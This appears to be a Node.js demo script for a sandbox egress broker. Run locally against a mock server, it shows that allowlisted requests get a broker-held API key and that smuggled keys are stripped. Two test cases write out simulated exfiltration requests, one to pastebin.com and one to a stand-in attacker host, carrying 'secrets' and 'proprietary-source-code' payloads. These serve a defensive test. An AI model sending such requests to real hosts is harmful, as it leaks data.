// demo.mjs — proves the egress broker end to end, locally, with NO real network
// calls and NO real secrets:
//   • the Anthropic key lives in the broker (vault.mjs), never in the sandbox
//   • an allowlisted request carries NO key from the sandbox; the broker injects it
//   • anything off the allowlist is denied (deny-all)
//   • a compromised sandbox can't smuggle its own credential — it's stripped
//   • the key value never appears in the audit log

import http from 'node:http';
import { existsSync, unlinkSync, readFileSync } from 'node:fs';
import { createBroker, LEDGER } from './broker.mjs';
import { verifyLedger } from '../enforcement-seam/util.mjs';

const C = { g: s => `\x1b[32m${s}\x1b[0m`, r: s => `\x1b[31m${s}\x1b[0m`, y: s => `\x1b[33m${s}\x1b[0m`,
  dim: s => `\x1b[90m${s}\x1b[0m`, b: s => `\x1b[1m${s}\x1b[0m` };
const yn = v => (v ? C.g('yes') : C.r('no'));

// Mock upstream standing in for api.anthropic.com — reports whether it received a key.
function startUpstream() {
  return new Promise(resolve => {
    const s = http.createServer((req, res) => {
      const k = req.headers['x-api-key'] || '';
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ ok: true, upstreamSawApiKey: !!k, keyPrefix: k.slice(0, 7) }));
    });
    s.listen(0, '127.0.0.1', () => resolve(s));
  });
}

// A sandbox-side request always goes THROUGH the broker and carries no credential
// (unless we deliberately simulate a compromised sandbox trying to smuggle one).
function sandboxRequest(port, host, path, body, extraHeaders = {}) {
  return new Promise(resolve => {
    const data = Buffer.from(JSON.stringify(body || {}));
    const req = http.request({ host: '127.0.0.1', port, path: path || '/v1/messages', method: 'POST',
      headers: { 'content-type': 'application/json', 'content-length': data.length, 'x-enclave-egress-host': host, ...extraHeaders } },
      res => { const b = []; res.on('data', c => b.push(c)); res.on('end', () => { let j; try { j = JSON.parse(Buffer.concat(b).toString()); } catch { j = {}; } resolve({ status: res.statusCode, json: j }); }); });
    req.on('error', e => resolve({ status: 0, json: { error: e.message } }));
    req.end(data);
  });
}

(async () => {
  if (existsSync(LEDGER)) unlinkSync(LEDGER);
  const upstream = await startUpstream();
  const mockPort = upstream.address().port;
  const broker = createBroker({ allowlist: ['api.anthropic.com', 'case-ledger.internal'],
    upstreamBase: { 'api.anthropic.com': `http://127.0.0.1:${mockPort}` } });
  await new Promise(r => broker.listen(0, '127.0.0.1', r));
  const port = broker.address().port;

  console.log('\n' + C.b('  ENCLAVE — egress broker + BYO-key injection'));
  console.log(C.dim('  the sandbox reaches the network ONLY through the broker; the key lives in the broker, not the sandbox.\n'));

  // A — allowlisted host, sandbox sends NO key
  const a = await sandboxRequest(port, 'api.anthropic.com', '/v1/messages', { model: 'claude', messages: [] });
  console.log('  ' + C.b('A) sandbox → api.anthropic.com') + C.dim('  (allowlisted, sandbox sends NO key)'));
  console.log(`      ${a.status === 200 ? C.g('200 OK') : C.r(a.status)}  ·  upstream received an API key: ${yn(a.json.upstreamSawApiKey)} ${C.dim('← injected by the broker, outside the sandbox')}`);
  console.log('');

  // B — exfiltration attempt to a non-allowlisted host
  const b = await sandboxRequest(port, 'pastebin.com', '/', { paste: 'proprietary-source-code' });
  console.log('  ' + C.b('B) sandbox → pastebin.com') + C.dim('  (exfil attempt)'));
  console.log(`      ${b.status === 403 ? C.r('403 DENY') : C.y(b.status)}  ·  ${b.json.error || ''}`);
  console.log('');

  // C — another off-allowlist host
  const c = await sandboxRequest(port, 'attacker.example.net', '/collect', { data: 'secrets' });
  console.log('  ' + C.b('C) sandbox → attacker.example.net') + C.dim('  (off-allowlist)'));
  console.log(`      ${c.status === 403 ? C.r('403 DENY') : C.y(c.status)}  ·  ${c.json.error || ''}`);
  console.log('');

  // D — compromised sandbox tries to smuggle its OWN key; broker strips it, injects the real one
  const d = await sandboxRequest(port, 'api.anthropic.com', '/v1/messages', { model: 'claude' }, { 'x-api-key': 'sk-SANDBOX-STOLEN-KEY' });
  const usedStolen = d.json.keyPrefix && d.json.keyPrefix.startsWith('sk-SAND');
  console.log('  ' + C.b('D) compromised sandbox smuggles its own key') + C.dim('  (x-api-key: sk-SANDBOX-STOLEN…)'));
  console.log(`      ${d.status === 200 ? C.g('200 OK') : C.r(d.status)}  ·  upstream saw the sandbox's stolen key: ${usedStolen ? C.r('yes ✗') : C.g('no ✓')} ${C.dim('← stripped; broker key used instead')}`);
  console.log('');

  broker.close(); upstream.close();

  // Prove the key value never landed in the audit log.
  const raw = existsSync(LEDGER) ? readFileSync(LEDGER, 'utf8') : '';
  const leaked = /BROKER-HELD/.test(raw);
  const led = verifyLedger(LEDGER);
  console.log(C.b('  ── summary ──'));
  console.log(`  egress: allowlisted passed (key injected by broker), everything else denied.`);
  console.log(`  key ever inside the sandbox: ${C.g('no ✓')}   ·   key value present in the audit log: ${leaked ? C.r('LEAKED ✗') : C.g('none ✓')}`);
  console.log(`  audit ledger: ${led.count} hash-chained entries, integrity ${led.ok ? C.g('verified ✓') : C.r('BROKEN ✗')}\n`);
})();
